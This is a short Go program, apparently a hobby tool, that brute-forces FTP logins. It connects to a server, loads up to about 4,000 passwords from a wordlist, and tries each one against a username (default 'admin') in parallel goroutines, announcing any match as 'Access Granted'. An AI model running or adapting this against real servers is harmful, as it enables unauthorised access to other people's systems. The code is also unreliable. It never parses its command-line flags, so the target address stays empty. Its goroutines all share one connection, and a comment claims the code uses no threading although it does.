package main

import (
	"bufio"
	"flag"
	"fmt"
	"github.com/jlaffaye/ftp"
	"log"
	"os"
	"sync"
	"time"
)

// Func check
func checkConnec(port string, address string) (c *ftp.ServerConn) {
	// Try to connect on the port 21
	c, err := ftp.Dial(address+":"+port, ftp.DialWithTimeout(5*time.Second))
	if err != nil {
		fmt.Println("The connection couldn't be made. Find further explanation below")
		log.Fatalln(err)
		os.Exit(-1)
	}
	// Else
	return c
}

// login attempt
func login(username string, password string, wg *sync.WaitGroup, c *ftp.ServerConn) bool {
	defer wg.Done()
	// login attempt
	err := c.Login(username, password)
	if err != nil {
		fmt.Println(username + " and pass " + password + " ARE INCORRECT")
		return false
	} else {
		fmt.Println("[+] Login found [+]")
		fmt.Println("-- Username " + username)
		fmt.Println("-- Password " + password)
		fmt.Println("[+] Access Granted [+]")
		return true
	}
}

func addingList() []string {
	file, err := os.Open("wordlists/passwords.txt")
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	i := 0
	for scanner.Scan() {
		if i > 4000 {
			break
		}
		// Creating the pass list
		pass = append(pass, scanner.Text())
		i++
	}

	return pass
}

var address string = "127.0.0.1"
var pass []string

func main() {

	ip := flag.String("h", "", "Select an IP address to scan")
	port := flag.String("p", "21", "Select a port (default 21)")
	username := flag.String("u", "admin", "Select an username know (default admin)")

	fmt.Println("Checking the host " + *ip + " and the port " + *port + " ...")
	c := checkConnec(*port, *ip)

	// if the host and port are open
	fmt.Println("Connexion have been made successfully")
	fmt.Println("Login attempt")

	// Login attempt
	// Reading file
	// Reading file, bufio for each line and trying to login with
	// Not a blind attack, but a username one
	// ATTEMPT WITHOUT THRREADING
	pass = addingList()

	var wg sync.WaitGroup

	// Connection loop
	for _, p := range pass {
		wg.Add(1)
		go login(*username, p, &wg, c)
	}

	wg.Wait()

}
